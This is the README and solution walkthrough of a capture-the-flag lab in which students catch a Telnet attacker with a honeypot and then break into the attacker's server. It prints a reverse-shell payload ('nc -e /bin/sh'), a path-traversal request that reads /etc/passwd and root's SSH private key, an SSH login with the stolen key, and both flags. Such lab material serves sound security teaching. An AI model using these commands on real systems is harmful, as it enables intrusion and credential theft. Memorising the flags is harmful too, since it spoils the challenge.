# Anyone Home?

An attacker-controlled container keeps probing hackerlab (telnet ports) and once it gets a shell, and it verifies its authenticity (by running 3 standard commands), it tries to deploy a malicious payload. 

Students must spot the activity, trick the attacker with a honeypot, analyse the dropped payload (1st flag), and finally attack back and pwn the attacker's (2nd flag) server.

### Tasks

1. **Is Anyone Home?** – Capture the malicious payload and extract the embedded flag.
2. **Bonus: Uno Reverse Card** – Exploit the attacker’s sloppy OPSEC, gain access to their box, and recover the bonus flag.

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

1. Start by monitoring inbound traffic on the student machine to confirm something is repeatedly reaching out over Telnet:
   ```bash
   root@hackerlab:~# tcpdump -n -vv -A port 23
   ```
   You should quickly notice connections and commands coming from `172.20.0.46`.

2. Instead of letting the attacker run commands on the real system, implement a honeypot and analyze attacker's actions. See a reference implementation in [auto-solve/telnet-honeypot.py](./auto-solve/telnet-honeypot.py)
   
3. Once you discover that attacker wants to download a payload from `http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp/payload.sh`, fetch the payload directly and inspect it:
   ```bash
   root@hackerlab:~# wget -O payload.sh http://172.20.0.46:8080//0ZbPWi0apUuFbpiwN2fp/payload.sh
   root@hackerlab:~# cat payload.sh
   #!/bin/sh
   # BSY{9YHgu60tUn5RjoYRTyViAMQWrci3y7w9x49w4qXXA3IHvWCb}
   nc -e /bin/sh 172.20.0.46 1234
   ```
   The comment line contains the first flag. Submit it through the dashboard.

4. To complete the bonus task, browse the attacker's staging directory to learn what else they exposed:
   ```bash
   root@hackerlab:~# curl http://172.20.0.46:8080/0ZbPWi0apUuFbpiwN2fp
   Files: 
   /var/www/payloads/payload.sh
   ```
   You see file paths, so maybe you can read files in the attacker's server. Voilá:
   ```bash
   root@hackerlab:~# curl http://172.20.0.46:8080/0ZbPWi0apUuFbpiwN2fp/../../../../../../etc/passwd --path-as-is
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   ...
   ```
   If you port scan the attacker's server, you can see these ports.
   ```bash
   root@hackerlab:~# nmap 172.20.0.46
   Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 17:20 UTC
   Nmap scan report for scl-challenge-anyone-home.playground-net (172.20.0.46)
   Host is up (0.0000070s latency).
   Not shown: 998 closed tcp ports (reset)
   PORT     STATE SERVICE
   22/tcp   open  ssh
   8080/tcp open  http-proxy
   MAC Address: 02:42:AC:14:00:2E (Unknown)
   
   Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
   ```
   Since you see there is SSH server running and you can read files in the target server, after some trial and error you can try to guess standard name of the root's SSH key:
   ```bash
   root@hackerlab:~# curl http://172.20.0.46:8080/0ZbPWi0apUuFbpiwN2fp//../../../../../../root/.ssh/authorized_keys --path-as-is
   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8DlQZk8AdLGV374MwEl45kdgRG8xFaIjOKeR7IuVNKKNE9iMRaALVKb0Q4lndsHn1HAREG6MlS3c1VZ1XfczA= hello@friend
   root@hackerlab:~# curl http://172.20.0.46:8080/0ZbPWi0apUuFbpiwN2fp//../../../../../../root/.ssh/key --path-as-is > attacker.key
   root@hackerlab:~# chmod 600 attacker.key
   ```

5. Use the key to authenticate to the attacker’s host and read the flag from root’s home:
   ```bash
   root@hackerlab:~# ssh -i attacker.key -o StrictHostKeyChecking=no root@172.20.0.46
   root@ea9e0637121f:~# ls -lah
   total 28K
   drwx------ 1 root root 4.0K Oct 20 17:13 .
   drwxr-xr-x 1 root root 4.0K Oct 20 17:19 ..
   -rw-r--r-- 1 root root  607 Aug 24 16:20 .bashrc
   -rw-r--r-- 1 root root   54 Oct 20 17:13 .flag.txt
   -rw-r--r-- 1 root root  132 Aug 24 16:20 .profile
   -rw------- 1 root root    0 Oct  9 22:38 .python_history
   drwx------ 1 root root 4.0K Oct 20 17:13 .ssh
   -rw-r--r-- 1 root root  169 Oct  9 22:33 .wget-hsts
   root@ea9e0637121f:~# cat .flag.txt
   BSY{cQZ3TSoUVgbiO3EeyZiI5IidU6lcknWhjFRdeJppxV8yRs9M}
   ```
   Submit the second flag to complete the bonus task.

</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
